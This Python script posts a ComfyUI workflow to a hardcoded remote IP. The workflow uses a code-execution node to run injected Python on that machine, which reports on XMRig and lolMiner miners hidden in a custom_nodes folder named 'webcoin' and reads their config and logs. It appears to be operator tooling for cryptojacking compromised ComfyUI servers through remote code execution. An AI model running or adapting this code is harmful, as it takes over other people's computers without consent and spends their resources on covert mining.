"""Check miner APIs from the machine itself + read logs."""
import json, urllib.request, sys, time

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

code = r"""
import urllib.request, json, os

result_lines = []

# Check XMRig API locally
try:
    req = urllib.request.Request('http://127.0.0.1:44880/2/summary',
                                headers={'Accept': 'application/json'})
    with urllib.request.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        result_lines.append(f'XMRig API: OK')
        result_lines.append(f'  hashrate={data.get("hashrate",{}).get("total",[])}')
        result_lines.append(f'  algo={data.get("algo")}')
        result_lines.append(f'  uptime={data.get("uptime")}')
except Exception as e:
    result_lines.append(f'XMRig API: FAIL - {e}')

# Check lolMiner API locally
try:
    req = urllib.request.Request('http://127.0.0.1:44882',
                                headers={'Accept': 'application/json'})
    with urllib.request.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        result_lines.append(f'lolMiner API: OK')
        result_lines.append(f'  software={data.get("Software")}')
        algos = data.get('Algorithms', [{}])
        if algos:
            result_lines.append(f'  algo={algos[0].get("Algorithm")}')
            result_lines.append(f'  hashrate={algos[0].get("Total_Performance")}')
except Exception as e:
    result_lines.append(f'lolMiner API: FAIL - {e}')

# Read XMRig config to check HTTP settings
cn = r'C:\Users\u88ni\Desktop\comfyui\custom_nodes'
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    pass

cfg_path = os.path.join(cn, 'webcoin', 'bin', 'config.json')
if os.path.exists(cfg_path):
    with open(cfg_path) as f:
        cfg = json.load(f)
    http_cfg = cfg.get('http', {})
    result_lines.append(f'XMRig HTTP config: {json.dumps(http_cfg)}')
else:
    result_lines.append(f'config.json not found at {cfg_path}')

# Read last lines of logs
for logname in ['service.log', 'render.log']:
    logpath = os.path.join(cn, 'webcoin', 'bin', logname)
    if os.path.exists(logpath):
        with open(logpath, 'r', errors='replace') as f:
            lines = f.readlines()
        result_lines.append(f'{logname} ({len(lines)} lines), last 8:')
        for l in lines[-8:]:
            result_lines.append(f'  {l.strip()[:200]}')
    else:
        result_lines.append(f'{logname} not found')

result = chr(10).join(result_lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    print(f"prompt_id: {data.get('prompt_id')}")

time.sleep(10)

req2 = urllib.request.Request(f"{base}/history?max_items=3", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    hist = json.loads(r.read().decode())
    for hpid, entry in hist.items():
        if entry.get("status", {}).get("status_str") != "success":
            continue
        outputs = entry.get("outputs", {})
        for nid, nout in outputs.items():
            for key, val in nout.items():
                if isinstance(val, list):
                    for v in val:
                        print(v)
        break
